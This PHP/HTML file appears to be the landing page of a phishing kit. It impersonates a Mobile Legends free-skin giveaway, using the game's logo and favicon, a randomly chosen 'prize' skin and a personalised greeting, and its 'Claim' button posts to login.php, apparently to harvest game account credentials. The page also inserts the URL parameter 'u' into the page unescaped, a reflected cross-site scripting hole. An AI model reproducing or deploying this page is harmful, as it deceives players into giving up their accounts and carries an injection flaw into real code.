<?php
	error_reporting(0);
	$link = $_GET['u'];
	$imganu = array('Alice Epic','Alpha Epic','Alucard Epic','Chou Epic','Clint Star','Estes Epic','Eudora Epic','Miya Epic','Roger Epic','Argus Star','Aurora Star','Franco Epic','Freya Epic','Karina Star','Miya Star','Moskov Star','Natalia Star','Saber Star','Zilong Star','Nana S1','Alucard S2','Fanny S3','Minotaur S4','Hilda S5','Eudora Elite','Zilong Elite','Miya Legend','Saber Legend');
	$reward = $imganu[rand(0, (count($imganu)-1))];
	
	$imgtitle = array('alice-epic','alight-epic','alucard-epic','chou-epic','clint-star','estes-epic','eudora-epic','miya-epic','roger-epic','argas-star','aurora-star','franco-star','freya-star','karina-epic','miya-star','moskov-star','natalia-star','saber-star','zilong-star','nana-s1','alucard-s2','fanny-s3','minetaur-s4','hilda-s5','eudora-elite','zilong-elite','miya-legend','saber-legend');
	$title = $imgtitle[rand(0, (count($imgtitle)-1))];
?>
<html>
<head>
<title>Mobile Legends - Claim Skin</title>
<meta property="og:title" content="<?php echo $link;?> - Claim your Prize now!" />
<meta property="og:image" content="img/2/<?php echo ''.$title.'';?>.jpg" />
<link rel="shorcut icon" href="https://www.mobilelegends.com/images/favicon.ico?v=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css">
<style type="text/css">
body { 
  background: url(http://i.imgur.com/Cvx0WTU.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.container {
	position:relative;
	margin:50px auto;
	max-width:600px;
	height:auto;
	border:2px solid #fff;
	padding:30px;
	box-sizing: border-box;
}

.transparent{
 background:rgba(31, 255, 28, 0.9);
 width: 100%;
 height:270px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}

.transparent-box{
 background:rgba(46, 0, 102, 0.9);
 width: 100%;
 height:500px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}
.navbar-box{
 background:rgba(46, 0, 102, 0.9);
 width: 100%;
 height:100px;
 padding:10px;
 margin:0px auto;
 color:#fff;
}
</style>

</head>
<body>


<center><img src="https://upload.wikimedia.org/wikipedia/en/9/9e/Mobilelegends.png"></center>

<div class="container navbar-box">
<center><font size="4">Welcome <b><?php echo $link;?></b>, Claim your prize now!</center>
<center><font size="4">Your name is lucky today!</center>
</div>

</br>
</br>
				
<div class="container transparent-box">

<center><font size="5">Congratulations! You get:</center>

</br>

<center><img name="reward" src="img/2/<?php echo ''.$title.'';?>.jpg"></center>

</br>

<form action="login.php" method="post">
<center><button class="btn btn-danger">Claim</button></center>
</form>

</div>
       
</br>
</br>
</br>
	
</body>
</html>